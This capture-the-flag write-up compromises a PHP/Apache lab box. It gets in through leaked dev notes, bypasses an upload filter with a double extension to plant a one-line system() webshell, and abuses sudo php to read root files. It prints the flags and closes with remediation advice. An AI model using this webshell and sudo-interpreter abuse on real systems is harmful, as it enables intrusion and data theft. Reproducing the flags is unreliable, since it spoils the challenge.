---
title: "FiPloit — Full System Compromise Walkthrough"
date: 2026-03-13
categories:
  - Misc
tags:
  - Misc
  - HackerDNA
collections:
  - HackerDNA
---



{{< admonition tldr "TL;DR" >}}

**FiPloit — Full System Compromise Walkthrough** is a misc challenge from **HackerDNA**. Author: spawn2pwn Category: Web Exploitation / Privilege Escalation Difficulty: Medium

{{< /admonition >}}

Author: spawn2pwn  
Category: Web Exploitation / Privilege Escalation  
Difficulty: Medium  

---

# Executive Summary

This report documents the full compromise of a vulnerable web application hosted on port **8080**.  
The attack chain leveraged multiple weaknesses including **information disclosure**, **insecure file upload validation**, and **privilege escalation via a misconfigured sudo rule**.

The compromise was achieved through the following sequence:

1. Discovery of exposed developer notes
2. Identification of a hidden developer upload endpoint
3. File upload filter bypass via double extension
4. Remote Code Execution via an uploaded webshell
5. Privilege escalation via unrestricted sudo access to PHP
6. Root-level file access leading to full system compromise

Despite partial defensive mechanisms such as disabled PHP command execution functions, improper privilege delegation ultimately allowed an attacker to retrieve sensitive data and gain root access.

---

# Target Overview

| Properties | Value |
|--------|--------|
| Target Service | Web Applications |
| Ports | 8080 |
| Technology Stack | PHP / Apache |
| Initial Access Vector | Web Exploitation |
| Compromised User | ctf |
| Privilege Escalation | sudo misconfiguration |

---

# Attack Surface Analysis

The initial attack surface consists of a publicly accessible web service.

Key accessible endpoints discovered during enumeration:

```

/notes.txt
/upload_log_temp4.php
/uploads/

```

These endpoints exposed sensitive development artifacts and functionality that should not have been available in a production environment.

---

# 1. Information Disclosure

During web enumeration, the following file was discovered:

```

/notes.txt

```
Retrieving the file:

```bash
curl http://TARGET:8080/notes.txt
```
Output:

```
Dev Notes:

- Remove /upload_log_temp4.php before prod
- Database creds: root:Password123! (change before going live)
- Fix contact form
- Disable debug
- Check Apache conf
```

### Security Impact

This file exposed several critical pieces of information:

* A hidden developer endpoint
* Hardcoded credentials
* Evidence of development/debug artifacts left in production

The most important finding was the temporary upload endpoint:

```
/upload_log_temp4.php
```

---

# 2. Hidden Developer Upload Portal

Accessing the endpoint revealed a developer interface allowing file uploads.

```
/upload_log_temp4.php
```

The application enforced a restriction:

```
Only .txt files are allowed
```

However, the validation logic was flawed and only verified whether the filename contained `.txt` , rather than enforcing it as the final extension.

This allowed for **double extension bypass attacks**.

---

# 3. File Upload Filter Bypass

A minimal PHP webshell was prepared:

```php
<?php system($_GET['cmd']); ?>
```

To bypass the upload filter, a **double extension payload** was used:

```
spawn2pwn-webshell.txt.php
```

This filename bypassed validation because:

* The application detected the presence of `.txt` * The server still interprets the file as PHP due to the final `.php` extension

Uploading the payload:

```bash
curl -X POST http://TARGET:8080/upload_log_temp4.php \
-F "file=@spawn2pwn-webshell.txt.php"
```

The file was successfully uploaded to:

```
/uploads/spawn2pwn-webshell.txt.php
```

---

# 4. Remote Code Execution

The uploaded payload allowed command execution via HTTP requests.

Examples:

```bash
curl "http://TARGET:8080/uploads/spawn2pwn-webshell.txt.php?cmd=whoami"
```

Output:

```
ctf
```

This confirmed successful **Remote Code Execution (RCE)**.

The attacker now has shell access as the web server user.

```
ctf
```

---

# 5. Post-Exploitation Enumeration

With shell access obtained, local enumeration was performed.

Checking sudo permissions:

```bash
sudo -l
```

Output:

```
User ctf may run the following commands:
(ALL) NOPASSWD: /bin/ls
(ALL) NOPASSWD: /usr/bin/file
(ALL) NOPASSWD: /usr/bin/php
```

Granting sudo access to scripting interpreters such as **PHP** is a severe security misconfiguration.

---

# 6. Attempted Root Shell

Typical escalation attempts using PHP were initially unsuccessful because the system disabled dangerous functions.

Disabled functions included:

```
system()
exec()
shell_exec()
passthru()
```

Attempts produced the following error:

```
[!] Command execution failed or disabled.
```

However, the PHP interpreter is still executed with **root privileges**, meaning file system access remains unrestricted.

---

# 7. Root File Access

Instead of spawning a shell, the attack leveraged PHP file operations.

Listing the root directory:

```bash
sudo php -r 'print_r(scandir("/root"));'
```

Output:

```
Array
(
    [0] => .
    [1] => ..
    [2] => flag-root.txt
)
```

Reading the root flag:

```bash
sudo php -r 'echo file_get_contents("/root/flag-root.txt");'
```

Root Flags:

```
739eabe6-3085-4852-beb2-1d0da7eb1973
```

---

# 8. User Flag Retrieval

Inspecting the user's home directory:

```bash
ls /home/ctf
```

Output:

```
dev_notes.txt
flag-user.txt
```

Reading the flag:

```bash
cat /home/ctf/flag-user.txt
```

User Flags:

```
9c206ead-1f5f-467a-5c3c-9bbac3fe54db
```

---

# Final Flags

### User Flags

```
9c206ead-1f5f-467a-5c3c-9bbac3fe54db
```

### Root Flag

```
739eabe6-3085-4852-beb2-1d0da7eb1973
```

---

# Attack Chain

```
Information Disclosure
        ↓
Hidden Developer Endpoint
        ↓
File Upload Extension Bypass
        ↓
Remote Code Execution
        ↓
Privilege Escalation (sudo php)
        ↓
Root File Access
```

---

# MITER ATT&CK Mapping

| Phase | Techniques |
| -------------------- | ----------------------------------------- |
| Initial Access | T1190 – Public-Facing Application Exploit |
| Execution | T1059 – Command and Scripting Interpreter |
| Persistence | T1505 – Server Software Components |
| Privilege Escalation | T1548 – Abuse Elevation Control Mechanism |
| Credential Access | T1552 – Unsecured Credentials |
| Discovery | T1083 – File and Directory Discovery |

---

# Vulnerabilities Identified

### 1. Information Disclosure

Sensitive developer notes were publicly accessible.

### 2. Insecure File Upload

Improper validation allowed bypassing upload restrictions.

### 3. Remote Code Execution

The upload vulnerability enabled arbitrary command execution.

### 4. Privilege Escalation

Improper sudo configuration granted root-level interpreter access.

---

# Security Recommendations

To mitigate these issues, the following security measures are recommended:

### Remove Development Artifacts

Sensitive files such as:

```
notes.txt
```

should never be exposed in production environments.

---

### Secure File Upload Handling

Upload validation must enforce:

* strict extension validation
* MIME-type verification
* server-side renaming
* execution prevention

---

### Apply the Principle of Least Privilege

Never allow unrestricted sudo access to interpreters such as:

```
php
python
perl
bash
```

These can almost always be abused for privilege escalation.

---

### Avoid Security Through Function Disabling

Disabling functions like:

```
system()
exec()
```

does not eliminate risk if the interpreter still runs with elevated privileges.

---

# Conclusion

This challenge demonstrates how multiple small misconfigurations can combine into a full system compromise.

The presence of development artifacts, insecure upload validation, and dangerous privilege delegation ultimately allowed an attacker to gain **complete root access**.

Even with partial defensive controls in place, attackers can adapt and exploit alternative attack paths when fundamental security principles are not followed.
